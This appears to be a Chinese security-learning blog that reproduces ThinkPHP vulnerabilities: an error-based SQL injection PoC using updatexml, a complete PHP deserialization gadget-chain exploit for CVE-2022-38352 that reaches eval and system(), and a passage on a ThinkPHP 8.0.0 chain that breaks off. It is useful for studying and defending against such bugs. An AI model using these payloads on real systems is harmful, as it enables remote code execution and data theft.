跟进这个db()方法：\n这里是连接数据库，并且指定了数据表为users表：\n然后调用了insert()方法：\n可以看到这里是调用了parseExpress()方法，跟了一下，里面就是对options这个变量进行了一下填充操作，在这个方法中，先是定义了一个$options变量，是一个数组类型，然后就是往这个数组类型的变量进行一些填充，里面有几个是后面要提到的点：\n这里的gettable()方法可以获取到table的名字，在这里就是users，并且将data的键设置为了空：\n然后后面有一个foreach操作，将键为fetch_sql的值设置为了false：\n然后在这方法之间，是进行了很多的填充，最后是返回了这个$option变量。\n退出了parseExpress()方法，然后调用了array_merrge()方法，这个是一个合并数组的操作，但是这里并没有合并？小怪，data的值还是没有改变。\n然后调用了insert()函数，这里的“发起者”是builder变量：\n看一下builder变量的定义：\n是数据库Builder对象实例，同时在这里，我们还可以看到一个数据库Connection对象实例。简单区别就是：\nConnection对象实例是表示数据库的连接实例，可以进行一些简单的SQL查询的功能，但是需要为一个完整的语句。\nbuilder对象实例，是一个数据库的查询构建器，用于动态生成复杂的SQL语句。\n然后就会调用到insert()方法：\n这里调用了一个parseData()函数，此时的参数传递如下：\n在这个函数中，在switch部分必须要匹配到，不然会直接退出导致不能执行sql执行操作，部分代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 $result = []; foreach ($data as $key =\u0026gt; $val) { $item = $this-\u0026gt;parseKey($key, $options); if (is_object($val) \u0026amp;\u0026amp; method_exists($val, \u0026#39;__toString\u0026#39;)) { // 对象数据写入 $val = $val-\u0026gt;__toString(); } if (false === strpos($key, \u0026#39;.\u0026#39;) \u0026amp;\u0026amp; !in_array($key, $fields, true)) { if ($options[\u0026#39;strict\u0026#39;]) { throw new Exception(\u0026#39;fields not exists:[\u0026#39; . $key . \u0026#39;]\u0026#39;); } } elseif (is_null($val)) { $result[$item] = \u0026#39;NULL\u0026#39;; } elseif (is_array($val) \u0026amp;\u0026amp; !empty($val)) { switch ($val[0]) { case \u0026#39;exp\u0026#39;: $result[$item] = $val[1]; break; case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; case \u0026#39;dec\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;-\u0026#39; . floatval($val[2]); break; } } elseif (is_scalar($val)) { // 过滤非标量数据 if (0 === strpos($val, \u0026#39;:\u0026#39;) \u0026amp;\u0026amp; $this-\u0026gt;query-\u0026gt;isBind(substr($val, 1))) { $result[$item] = $val; } else { $key = str_replace(\u0026#39;.\u0026#39;, \u0026#39;_\u0026#39;, $key); $this-\u0026gt;query-\u0026gt;bind(\u0026#39;data__\u0026#39; . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR); $result[$item] = \u0026#39;:data__\u0026#39; . $key; } } } return $result; 这里调用的foreach，会匹配到val[0]，也就是fupanc这个值，后面会进入到switch的语句中，然后就会进行switch匹配，如果这里不呢个匹配到，后面由于is_scalar函数匹配标量，不会进入，就会直接返回一个空数组（$result），然后再insert()函数中直接return 0了：\n1 2 3 4 $data = $this-\u0026gt;parseData($data, $options); if (empty($data)) { return 0; } 就不会有后面的替换操作返回一个正常的sql语句了。\n而返回了一个0过后呢，就不能执任何sql语句了：\n前面的在填充option时标注为了false，前面提到了，然后这里由于result为0，直接就不会执行后续操作了。导致最后的sql语句插入是没用的。\n现在再来仔细看一下这个POC:\n1 ?username[0]=inc\u0026amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)\u0026amp;username[2]=1 这里的传参是加上了一个inc的，也就是说，转折点就是在switch语句，这里再看看switch的代码逻辑：\n1 2 3 4 5 6 7 8 9 10 switch ($val[0]) { case \u0026#39;exp\u0026#39;: $result[$item] = $val[1]; break; case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; case \u0026#39;dec\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;-\u0026#39; . floatval($val[2]); break; 这里会匹配val[0]的值，值的赋予是前面提到了的，也就是如果传参如下：\n1 username[0]=1\u0026amp;username[1]=2 那么这里的val的值就是包含到1和2两个值的数组，那么在这里，可以尝试传参：\n1 username[0]=exp\u0026amp;username[1]=fupanc 再看看情况呢，还是进不去，这里输出为：\n在exp后面似乎多了一个空格，phpstorrm的问题？\n那么在网页上传参试试呢，还是不行呢。\n那么最后再调试一下POC：\n1 ?username[0]=inc\u0026amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)\u0026amp;username[2]=1 这下又完全正确了：\n这。。。\n那就看这个吧，在case中利用到的函数如下：\n1 2 3 case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; 这里的parseKey()函数最后其实返回的就是传进去的值，而floatval()函数则是将其转换为浮点型，最后相加，结果如下：\n返回的result不为空了，回到insert()函数，然后调用了array_keys和array_values函数来分别生成key和value的数组，也就是前面result中的值，然后进行了替换操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $fields = array_keys($data); $values = array_values($data); $sql = str_replace( [\u0026#39;%INSERT%\u0026#39;, \u0026#39;%TABLE%\u0026#39;, \u0026#39;%FIELD%\u0026#39;, \u0026#39;%DATA%\u0026#39;, \u0026#39;%COMMENT%\u0026#39;], [ $replace ? \u0026#39;REPLACE\u0026#39; : \u0026#39;INSERT\u0026#39;, $this-\u0026gt;parseTable($options[\u0026#39;table\u0026#39;], $options), implode(\u0026#39; , \u0026#39;, $fields), implode(\u0026#39; , \u0026#39;, $values), $this-\u0026gt;parseComment($options[\u0026#39;comment\u0026#39;]), ], $this-\u0026gt;insertSql); return $sql; 最后的sql语句为：\n1 INSERT INTO `users` (`username`) VALUES (updatexml(1,concat(0x7e,user(),0x7e),1)+1) 最后成功执行：\n成功进行报错注入：\n——————\n修复方案 官方的修复方案是修改switch语句的逻辑：\n1 2 3 4 5 6 7 8 9 10 11 switch (strtolower($val[0])) { case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; case \u0026#39;dec\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;-\u0026#39; . floatval($val[2]); break; case \u0026#39;exp\u0026#39;: $result[$item] = $val[1]; break; } 总结 第一次审下来，确实代码审计需要比较细心呀，有些时候就是一些传参就能达到注入的效果，还有需要注意代码之间的联系，有些时候在代码的后半段会有比较重要的代码逻辑体现，还是多加注意。\nThinkphp v6.0.13反序列化漏洞 CVE-2022-38352\n环境搭建 和之前有点不一样了，thinkphp6以上就只有使用composer来安装了，比如这里的使用方法是：\n1 2 composer create-project topthink/think=6.0.13 think-6.0.13 //简单解析一下，这里就是指定了thinkphp的版本，然后这里的tp6就是将源码下载在当前目录的tp6目录下 如果有报错的话一般就是php.ini配置文件有些配置需要修改，比如需要开启zip的配置等，其实问AI都能问出来。\n然后访问网站的public/index.php，如果报错Your Composer dependencies require a PHP version “＞= 7.4.0，那么就需要改一下配置文件：\n1 2 3 \u0026#34;config\u0026#34;:{ \u0026#34;platform-check\u0026#34;: false } 此时搭建成功，但是会发现版本不对，所以需要\n还是改配置，在framework这里直接指定版本：\n1 2 3 4 5 \u0026#34;require\u0026#34;: { \u0026#34;php\u0026#34;: \u0026#34;\u0026gt;=7.2.5\u0026#34;, \u0026#34;topthink/framework\u0026#34;: \u0026#34;6.0.13\u0026#34;, \u0026#34;topthink/think-orm\u0026#34;: \u0026#34;^2.0\u0026#34; }, 然后再使用composerr update即可，最后成功搭建：\n下载来的源码可以看到这里的php版本要求是大于等于7.2.5的，这里还是直接使用前面的7.3.4即可。\n然后在app\\controller\\Index.php文件中加上入口：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php namespace app\\controller; use app\\BaseController; class Index extends BaseController { public function index() { if($_POST[\u0026#34;a\u0026#34;]){ unserialize(base64_decode($_POST[\u0026#34;a\u0026#34;])); } return \u0026#39;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: \u0026#34;Century Gothic\u0026#34;,\u0026#34;Microsoft yahei\u0026#34;; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }\u0026lt;/style\u0026gt;\u0026lt;div style=\u0026#34;padding: 24px 48px;\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;:) \u0026lt;/h1\u0026gt;\u0026lt;p\u0026gt; ThinkPHP V\u0026#39; . \\think\\facade\\App::version() . \u0026#39;\u0026lt;br/\u0026gt;\u0026lt;span style=\u0026#34;font-size:30px;\u0026#34;\u0026gt;16载初心不改 - 你值得信赖的PHP框架\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt;\u0026lt;span style=\u0026#34;font-size:25px;\u0026#34;\u0026gt;[ V6.0 版本由 \u0026lt;a href=\u0026#34;https://www.yisu.com/\u0026#34; target=\u0026#34;yisu\u0026#34;\u0026gt;亿速云\u0026lt;/a\u0026gt; 独家赞助发布 ]\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://e.topthink.com/Public/static/client.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;think id=\u0026#34;ee9b1aa918103c4fc\u0026#34;\u0026gt;\u0026lt;/think\u0026gt;\u0026#39;; } public function hello($name = \u0026#39;ThinkPHP6\u0026#39;) { return \u0026#39;hello,\u0026#39; . $name; } } 代码审计分析 反序列化，一般都是从__destruct或者__wakeup入手的，这里还是从__destruct方法入手，直接全局搜索这个方法，可以看到有如下几个逻辑：\n搜到了如上几个方法，看了一下，感觉如下的两个点可能存在利用：\nLeague\\Flysystem\\Cached\\Storage\\AbstractCache ：\n1 2 3 4 5 6 public function __destruct() { if (! $this-\u0026gt;autosave) { $this-\u0026gt;save(); } } think\\Model ：\n1 2 3 4 5 6 public function __destruct() { if ($this-\u0026gt;lazySave) { $this-\u0026gt;save(); } } 看参考文章的入手点是AbstractCache抽象类的方法，所以就是第二个destruct()方法，简单跟一下。\nlazySave就是类的一个变量，在反序列化时可以赋值为任意值，跟进调用的save()方法，这里的AbstractCache类是抽象类，所以是必然有save()方法的实现了，AbstractCache类的实现类有如下几个：\n这里的链子是需要调用到League\\Flysystem\\Cached\\Storage\\Psr6Cache的save()方法：\n1 2 3 4 5 6 7 public function save() { $item = $this-\u0026gt;pool-\u0026gt;getItem($this-\u0026gt;key); $item-\u0026gt;set($this-\u0026gt;getForStorage()); $item-\u0026gt;expiresAfter($this-\u0026gt;expire); $this-\u0026gt;pool-\u0026gt;save($item); } 不是很清楚这里，确实会找子类的save()方法的实现，但是不知道为什么这里就是调用的这个类的save()方法，先不管，跟一下链子，后面分析一下生成逻辑。\n链子后面会再次调用到__call()方法，只要将这个理的$this-\u0026gt;pool设置为一个类即可，这里选用的是think\\log\\Channel类的__call()方法：\n1 2 3 4 public function __call($method, $parameters) { $this-\u0026gt;log($method, ...$parameters); } 参数传递的话，这里的$method是getItem()方法名，而$parameters就是前面传的$this-\u0026gt;key，看了一下，这个pool和key都是类定义的变量，所以这里都是可控的。然后跟进log()方法，会调用record()方法：\n1 2 3 4 public function log($level, $message, array $context = []) { $this-\u0026gt;record($message, $level, $context); } 然后再跟进record()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 public function record($msg, string $type = \u0026#39;info\u0026#39;, array $context = [], bool $lazy = true) { if ($this-\u0026gt;close || (!empty($this-\u0026gt;allow) \u0026amp;\u0026amp; !in_array($type, $this-\u0026gt;allow))) { return $this; } if (is_string($msg) \u0026amp;\u0026amp; !empty($context)) { $replace = []; foreach ($context as $key =\u0026gt; $val) { $replace[\u0026#39;{\u0026#39; . $key . \u0026#39;}\u0026#39;] = $val; } $msg = strtr($msg, $replace); } if (!empty($msg) || 0 === $msg) { $this-\u0026gt;log[$type][] = $msg; if ($this-\u0026gt;event) { $this-\u0026gt;event-\u0026gt;trigger(new LogRecord($type, $msg)); } } if (!$this-\u0026gt;lazy || !$lazy) { $this-\u0026gt;save(); } return $this; } 继续看链子，在record()方法中，主要还是为了调用最后的save()方法，简单看一下前面的代码，看是否可以实现调用save()方法：\n前面总的来说是需要通过三个if条件，\n第一个if条件： 1 2 3 if ($this-\u0026gt;close || (!empty($this-\u0026gt;allow) \u0026amp;\u0026amp; !in_array($type, $this-\u0026gt;allow))) { return $this; } 就是需要$this-\u0026gt;close为false，然后后面的allow定义是一个数组，从代码逻辑来看，要么这个数组为空，要么这个数组里面存在getItem这个值，就不会进入这个if语句。\n第二个if条件： 1 2 3 4 5 6 7 8 if (is_string($msg) \u0026amp;\u0026amp; !empty($context)) { $replace = []; foreach ($context as $key =\u0026gt; $val) { $replace[\u0026#39;{\u0026#39; . $key . \u0026#39;}\u0026#39;] = $val; } $msg = strtr($msg, $replace); } 判断$msg是否为字符串类型，然后判断$context变量是否为空，这个$msg的值是可控的，而且从record()函数的形参来看，这里的$context变量就是一个空值，所以第二个if条件应该是不会进入的。\n第三个if条件： 1 2 3 4 5 6 if (!empty($msg) || 0 === $msg) { $this-\u0026gt;log[$type][] = $msg; if ($this-\u0026gt;event) { $this-\u0026gt;event-\u0026gt;trigger(new LogRecord($type, $msg)); } } 这里$msg不为空，就可以进入这个if条件，同样可以控制到不进入这个if条件，但是这里还不知道有什么用，先不管。\n最后到了调用save()方法的if语句： 1 2 3 if (!$this-\u0026gt;lazy || !$lazy) { $this-\u0026gt;save(); } 这里的$this-\u0026gt;lazy变量是类变量，可以控制。\n那么现在来看save()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public function save(): bool { $log = $this-\u0026gt;log; if ($this-\u0026gt;event) { $event = new LogWrite($this-\u0026gt;name, $log); $this-\u0026gt;event-\u0026gt;trigger($event); $log = $event-\u0026gt;log; } if ($this-\u0026gt;logger-\u0026gt;save($log)) { $this-\u0026gt;clear(); return true; } return false; } 这里的$this-\u0026gt;logger可控，调用任意类的save()方法，或者__call()方法，但是这里的链子跟的是think\\log\\driver\\Socket类的save()方法：\n需要check()函数返回true，跟进check()函数：\n这里只需要控制$this-\u0026gt;config['force_client_ids']为true，$this-\u0026gt;config['allow_client_ids']为空，最后就会返回true。（ps:关键代码逻辑处理真重要呀，自己先看了一下，一直没提取出来重点，看了一下参考文章，这重点抓得是真准呀，只需要控制这几个参数就可以直接达到目的）。\n而对于这里得config，定义就是一个数组，如下：\n最后成功通过check()函数。回到save()函数，通过控制$this-\u0026gt;config['debug']为true，从而进入到if条件：\n然后这里是将$this-\u0026gt;app设置为了think\\APP类，但是这个APP类没有exists()方法，会调用到父类Container得exists()方法：\n从注释中可以看出这里就是在判断容器中是否有独享实例，参数传递中可以看出这里是判断是否有request这个类的实例，跟进这个getAlias()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 public function getAlias(string $abstract): string { if (isset($this-\u0026gt;bind[$abstract])) { $bind = $this-\u0026gt;bind[$abstract]; if (is_string($bind)) { return $this-\u0026gt;getAlias($bind); } } return $abstract; } 对于第一个if语句，跟进判断的$this-\u0026gt;bind[$abstract]，由于这里的$this调用关系，这里判断的是App类的bind变量：\n可以看到这里是绑定到有Request.class类的，所以这里的getAlias()方法最后是会返回这个Request类的完全包名，也就是会返回think\\Request。然后回到exists()方法，会判断是否有实例化类，也就是$this-\u0026gt;instance['think\\Request']要为true，同样可以直接在类初始化时设置，比如$this-\u0026gt;instance赋值为['think\\Request'=\u0026gt;new Request()]。\n最后回到Socket文件的save()方法，然后就会调用Request类的url()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public function url(bool $complete = false): string { if ($this-\u0026gt;url) { $url = $this-\u0026gt;url; } elseif ($this-\u0026gt;server(\u0026#39;HTTP_X_REWRITE_URL\u0026#39;)) { $url = $this-\u0026gt;server(\u0026#39;HTTP_X_REWRITE_URL\u0026#39;); } elseif ($this-\u0026gt;server(\u0026#39;REQUEST_URI\u0026#39;)) { $url = $this-\u0026gt;server(\u0026#39;REQUEST_URI\u0026#39;); } elseif ($this-\u0026gt;server(\u0026#39;ORIG_PATH_INFO\u0026#39;)) { $url = $this-\u0026gt;server(\u0026#39;ORIG_PATH_INFO\u0026#39;) . (!empty($this-\u0026gt;server(\u0026#39;QUERY_STRING\u0026#39;)) ? \u0026#39;?\u0026#39; . $this-\u0026gt;server(\u0026#39;QUERY_STRING\u0026#39;) : \u0026#39;\u0026#39;); } elseif (isset($_SERVER[\u0026#39;argv\u0026#39;][1])) { $url = $_SERVER[\u0026#39;argv\u0026#39;][1]; } else { $url = \u0026#39;\u0026#39;; } return $complete ? $this-\u0026gt;domain() . $url : $url; } 可以控制url变量，测试了一下这里的if语句，只要有给$this-\u0026gt;url赋值，那么这里的if语句就为真，判断规则如下：\n所以我们可以给$url赋值为任意值。\n在最后的return语句，由于参数的传递，会调用$this-\u0026gt;domain()方法，然后是一个拼接url值得操作，跟进一下这里得domain()方法：\n1 2 3 4 public function domain(bool $port = false): string { return $this-\u0026gt;scheme() . \u0026#39;://\u0026#39; . $this-\u0026gt;host($port); } 调用domain()方法时没有传参，所以这里的$port为false，方法内容就是获取协议头和域名的操作，也就是获取包含当前协议的域名，但是这里会直接返回我们可控的host的值，代码逻辑如下：\n参数传递，会让$strict变量设置为false，在三目运算符中会得到后面的那个值，也就是$host的值。\n最后调用完url()函数过后，回到save()方法，会将返回的值赋值给$currentUri变量：\n然后这里只要控制$this-\u0026gt;config['format_head']不为空，就可以调用到think\\App类的invoke()方法，而这个$this-\u0026gt;config['format_head']，同样是可控的，而think\\App是没有invoke()方法的，其实还是调用的父类Container的invoke()方法：\n1 2 3 4 5 6 7 8 9 10 public function invoke($callable, array $vars = [], bool $accessible = false) { if ($callable instanceof Closure) { return $this-\u0026gt;invokeFunction($callable, $vars); } elseif (is_string($callable) \u0026amp;\u0026amp; false === strpos($callable, \u0026#39;::\u0026#39;)) { return $this-\u0026gt;invokeFunction($callable, $vars); } else { return $this-\u0026gt;invokeMethod($callable, $vars, $accessible); } } 然后链子是看第三个invokeMethod()方法：\n前面的分割类名和方法名的操作，最开始我本来是想要使用else中的方法来进行分割的，后面构造的时候发现有点问题，只能被解析成字符串，也有可能是我传参格式有点问题，其实这里使用前面的if语句中的条件才是最好用的，直接用一个数组传参即可，并且这里还有个invokeClass()方法来确保是一个obejct对象。然后看上图重点标注出来的部分，这里是一个反射操作，和java的很像，反射获取类及方法，然后动态执行。\n在这里，我们就可以找一下有无什么函数可以动态调用,可以用Seay源代码审计工具自动审计一下：\n可以看到这个display()函数是存在命令执行漏洞的，存在think\\view\\driver\\Php文件中，现在就是看怎么进行参数传递来打了，参数传递感觉也是很有意思的呀：\n在explode()函数中使用::来分割class和method，感觉传参是：\n1 2 a=new think\\view\\driver\\Php() a:: display 这样？感觉像是。\n然后再使用ReflectionMethod()方法来反射获取到要调用的方法，再然后使用bindParams()方法来绑定参数，最后调用invokeArgs()来执行这个方法。\n而在命令执行是如下：\n1 eval(\u0026#39;?\u0026gt;\u0026#39; . $this-\u0026gt;content); 如下就可以进行命令执行：\n1 2 3 4 \u0026lt;?php $content=\u0026#34;\\\u0026lt;?php system(\u0026#39;whoami\u0026#39;);?\u0026gt;\u0026#34;; eval(\u0026#39;?\u0026gt;\u0026#39; . $content); 所以传参就需要传\u0026lt;?php system('whoami');?\u0026gt;即可，这里的参数传递其实就是前面$currentUri的内容，也就是直接将前面的$url设置为php代码即可。\n最后的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 \u0026lt;?php namespace League\\Flysystem\\Cached\\Storage; //abstract class AbstractCache //{ // protected $autosave = false; //} class Psr6Cache { private $pool; protected $autosave = false; function __construct($a){ $this-\u0026gt;pool=$a; } } namespace think\\log; class Channel{ protected $logger; protected $event; protected $lazy; function __construct($b){ $this-\u0026gt;lazy=false; $this-\u0026gt;event=false; $this-\u0026gt;logger=$b; } } namespace think\\view\\driver; class Php{ } namespace think\\log\\driver; class Socket{ protected $app; protected $config =[]; function __construct($b){ $this-\u0026gt;app=$b; $this-\u0026gt;config=[ \u0026#39;force_client_ids\u0026#39; =\u0026gt; true, \u0026#39;allow_client_ids\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;debug\u0026#39; =\u0026gt; true, \u0026#39;format_head\u0026#39; =\u0026gt; [new \\think\\view\\driver\\Php,\u0026#39;display\u0026#39;] ]; } } namespace think; class Request{ protected $url; function __construct(){ $this-\u0026gt;url=\u0026#34;\u0026lt;?php system(\u0026#39;calc\u0026#39;); ?\u0026gt;\u0026#34;; } } class App{ protected $instances = []; function __construct(){ $this-\u0026gt;instances=[ \u0026#39;think\\Request\u0026#39; =\u0026gt; new Request() ]; } } $d=new App; $b=new \\think\\log\\driver\\Socket($d); $a=new \\think\\log\\Channel($b); $c=new \\League\\Flysystem\\Cached\\Storage\\Psr6Cache($a); echo urlencode(base64_encode(serialize($c))); 其实基本链子知道了，就可以直接构造好类，然后生成序列化数据，如果还是有问题，在调试时再一步一步修改。\n最后是成功弹出计算机的：\n从页面显示是知道有回显的。所以可以直接打有回显的命令执行。\n问题解决 前面留了一个问题，不知道为什么会选择Psr6Cache类的save()方法。其实从整个构造过程下来看，就基本上已经懂了。首先，选用Psr6Cache类是完美符合链子的，其次，在java的学习中，我们可以知道在反序列化一个类时，同时还会反序列化它的父类，这样就会触发AbstractCache类的__destrcut()方法，从而使得链子执行。\n而页面回显的http://，其实就是链子中拼接url后的结果，但是php代码被执行了，所以只有这个回显：\n————\n总结 从这个链子中，学到了很多，关键代码的抓取、关键类的选取。。。\n感觉挖一条链子真的是要看很多代码呀，函数调用当然不难，但是要找到对应的函数，还是比较花耐心的，intersting，某两个方法配合起来就能打成一条链子。\n同时在这里知道，对于一些框架，有些漏洞点真可以去github issue上看，我看这条链子的POC就是在github issue上可以看到的，可以看参考文章。\n参考文章：\nhttps://github.com/top-think/framework/issues/2749\nhttps://xz.aliyun.com/news/11615?time__1311=eqUxuQDtDQitqAKD%3DD%2FFn%2BCBKqGQqD9QnGoD\u0026u_atoken=d85375bd9b5b083adb46a87b18f126c7\u0026u_asig=1a0c399a17410911216675510e012d\nhttps://blog.csdn.net/qq_29920751/article/details/87630803\nhttps://blog.csdn.net/qq_21296205/article/details/128369757\n——————————\nThinkphpv8.0.0 反序列化漏洞 需要使用php8，我这里是php8.2.9+thinkphp v8.0.0\n这个是nivia学长在2024xctf final出的题，当时他是挖出来的0day，这里也是来复现一下。\n——————\n环境搭建 环境搭建一个php8的环境，参考之前发的搭建的php7的调试环境教程，差不多的。\n然后下载源码：\n1 composer create-project topthink/think=8.0.0 think-8.0.0 改composer.json文件的框架版本为指定版本8.0.0，然后运行composer update更新一下即可。\n最后访问成功搭建：\n这里还是在app/controller/Index页面加一个入口即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php namespace app\\controller; use app\\BaseController; class Index extends BaseController { public function index() { unserialize(base64_decode($_POST[\u0026#39;a\u0026#39;])); return \u0026#39;\u0026lt;style\u0026gt;*{ padding: 0; margin: 0; }\u0026lt;/style\u0026gt;\u0026lt;iframe src=\u0026#34;https://www.thinkphp.cn/welcome?version=\u0026#39; . \\think\\facade\\App::version() . \u0026#39;\u0026#34; width=\u0026#34;100%\u0026#34; height=\u0026#34;100%\u0026#34; frameborder=\u0026#34;0\u0026#34; scrolling=\u0026#34;auto\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;; } public function hello($name = \u0026#39;ThinkPHP8\u0026#39;) { return \u0026#39;hello,\u0026#39; . $name; } } 然后就可以开始愉快的代码审计了。\nps：好像这条链子后半部分和一个thinkphp6的很像，和我前面审的不一样，直接从这里学了，不再返回去审计那个了。\n——————\n代码审计 在一篇文章中看到了一个点，代码审计要选好sink点和source点，然后在挖链子的过程中去靠即可，感觉还是比较有意思的。\n——————\nsource点选择 一般的source点就是__destruct或者__wakeup方法，直接全局搜索__destruct方法，找到两个可以使用的点：\nLeague\\Flysystem\\Cached\\Storage\\AbstractCache：\n1 2 3 4 5 6 public function __destruct() { if (! $this-\u0026gt;autosave) { $this-\u0026gt;save(); } } think\\route\\ResourceRegister：\n1 2 3 4 5 6 public function __destruct() { if (!$this-\u0026gt;registered) { $this-\u0026gt;register(); } } 在这里选择的是第二个。\nsink点选择 一般框架的反序列化sink点都会选择call方法，因为一般可能的危险操作都在call方法上。\n在这里使用的是think\\Validate#__call，代码逻辑如下：\n1 2 3 4 5 6 7 8 9 10 public function __call($method, $args) { if (\u0026#39;is\u0026#39; == strtolower(substr($method, 0, 2))) { $method = substr($method, 2); } array_push($args, lcfirst($method)); return call_user_func_array([$this, \u0026#39;is\u0026#39;], $args); } 这个代码逻辑，如果想要能够进入if语句，需要$method名为类似iseval这种，然后就会截取，将$method的值更新为eval这种，最后就调用了call_user_func_array()方法，这个函数的调用也是非常有意思，给一个代码说说这里的逻辑：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class Foo { function bar($arg, $arg2) { echo __METHOD__, \u0026#34; got $arg and $arg2\\n\u0026#34;; } } $foo = new Foo; call_user_func_array(array($foo, \u0026#34;bar\u0026#34;), array(\u0026#34;three\u0026#34;, \u0026#34;four\u0026#34;)); //output: Foo::bar got three and four 可以知道，这里就是调用$foo实例的bar()函数，那么同样的，在原来的payload上，这里就是调用$this的is()函数，全局搜索is函数，得到了如下函数：\n同样还是think/Validate类的is()函数，从图中可以看到最后这里的参数都是可控的，可以达到调用回调函数来达到命令注入的效果。\n现在sink点和source点都找到了，来看一下中间的链子。\n链子寻找 入口点是 think\\route\\ResourceRegister类的__destruct函数：\n1 2 3 4 5 6 public function __destruct() { if (!$this-\u0026gt;registered) { $this-\u0026gt;register(); } } $this-\u0026gt;registered变量可控，然后回调用到register()方法：\n1 2 3 4 5 6 protected function register() { $this-\u0026gt;registered = true; $this-\u0026gt;resource-\u0026gt;parseGroupRule($this-\u0026gt;resource-\u0026gt;getRule()); } 其实这里就能尝试调用__call()方法，但是在前面想要进行命令执行的地方，是需要在调用__call()方法时是需要有参数的，但是这里的getRule()方法是无法进行传参的。\n还是直接跟进，调用的getRule()方法会调用到Resource.php文件的父类的父类Rule类的getRule()方法：\n1 2 3 4 public function getRule() { return $this-\u0026gt;rule; } 所以这里的参数是可控的。\n然后看一下parseGroupRule()方法，会调用到Resource.php文件的parseGroupRule()方法：\n如上图，通过参数的控制，我们可以直接跳过第一个if语句的执行，直接执行后面的代码，然后看第二个框出来的部分，可以看见很明显的拼接操作，这里是可以尝试调用toString链的，这里再简单看一下这里的参数情况，看是否可以控制，审计了一下，发现是可以控制的，具体就看后面的POC吧，继续找链子。。\n现在就是需要去找调用toString()链子，这里选用的是think\\model\\concern\\Conversion类的__toString()链：\n跟进这个toJson()：\n然后调用toArray()：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 public function toArray(): array { $item = $visible = $hidden = []; $hasVisible = false; foreach ($this-\u0026gt;visible as $key =\u0026gt; $val) { if (is_string($val)) { if (str_contains($val, \u0026#39;.\u0026#39;)) { [$relation, $name] = explode(\u0026#39;.\u0026#39;, $val); $visible[$relation][] = $name; } else { $visible[$val] = true; $hasVisible = true; } } else { $visible[$key] = $val; } } foreach ($this-\u0026gt;hidden as $key =\u0026gt; $val) { if (is_string($val)) { if (str_contains($val, \u0026#39;.\u0026#39;)) { [$relation, $name] = explode(\u0026#39;.\u0026#39;, $val); $hidden[$relation][] = $name; } else { $hidden[$val] = true; } } else { $hidden[$key] = $val; } } // 追加属性（必须定义获取器） foreach ($this-\u0026gt;append as $key =\u0026gt; $name) { $this-\u0026gt;appendAttrToArray($item, $key, $name, $visible, $hidden); } ..............等代码 } 这里主要主要就是要调用最后的appendAttrToArray()方法：\n然后调用这里的getRelationWith()方法：\n这里就可以触发__call()方法，对于参数的传递，其实不难，但是有一个点没想明白：\n这里的rule会是什么？问我传参时并没有传这个参数，先简单构造看看这里的参数是什么。\nexp构造 问题说明 这里的参数说明就不具体说明了，直接构造即可，实在想不出的时候可以再看看P我构造出来的POC，这里有几个点需要说明一下：\n1.\n在前面的链子找寻过程中，可以知道链子其中一个是trait类型的Conversion类，是代码复用类型的，不能直接实例化来使用，但是我们需要利用到他的__toString()方法，怎么利用呢，自己构造的时候也是在Conversion类中有一个向下找的按钮：\n往下跳，到了Model抽象类:\n再往下就到了Pivot类：\n这个类就是可以直接实例化来使用的，所以最后我们要使用的类就是这个类。\n——————\n2.\n还有个就是前面遗留的$rule参数问题：\n果然还是调试一下就知道了，这里的$rule变量的值是visible，后面简单说说是怎么进行的：\n在__call方法中，触发的点是visible()方法：\n所以如下__call源码，这里会直接将这个$method的值直接push上数组中：\n让然后在调用is()函数时，对于$value和$rule的值，就是数组的第一个值和第二个值。\n3.\n最重要的一点，nivia师傅tql，也是我卡住的一点，导致这一步没构造出POC，简单贴一下我的原本错误的POC：\n1 2 3 4 5 6 